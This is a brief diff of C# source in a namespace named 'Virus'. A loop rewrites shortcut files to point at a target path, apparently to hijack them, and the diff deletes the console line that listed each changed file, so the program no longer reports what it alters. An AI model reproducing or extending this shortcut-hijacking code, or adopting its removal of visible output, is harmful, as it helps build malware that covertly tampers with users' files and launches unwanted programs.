@@ -32,8 +32,6 @@ namespace Virus
                 {
                     LnkHelper.ChangeShortcut(file.FullName, targetPath, QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                 }
-                Console.WriteLine($"{++count}. {file.Name}");
-
             }
         }
 
